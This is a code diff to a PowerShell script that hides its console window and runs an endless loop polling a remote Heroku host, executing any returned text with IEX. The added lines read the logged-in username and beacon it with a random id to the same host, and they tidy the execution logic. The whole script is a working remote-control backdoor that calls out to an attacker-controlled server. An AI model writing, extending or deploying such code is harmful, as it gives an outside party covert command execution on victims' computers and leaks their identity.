@@ -11,14 +11,18 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 
 $ps = "";
 $id = Get-Random
+$username=( ( Get-WMIObject -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
 $wshell = New-Object -ComObject wscript.shell;
 while (1) 
 {
+(New-Object System.Net.WebClient).DownloadString("http://twobii.herokuapp.com/rs/ping/" + $id + "/" + $username)
 $s = (New-Object System.Net.WebClient).DownloadString("http://twobii.herokuapp.com/rs/listen/" + $id);
 if ($s -ne $ps) 
-{
-IEX $s
-ps = $s
-};
+{	
+if ([string]::IsNullOrEmpty($s) -eq 0) {
+IEX $s;
+$ps = $s;
+}
+}
 sleep 1
 }
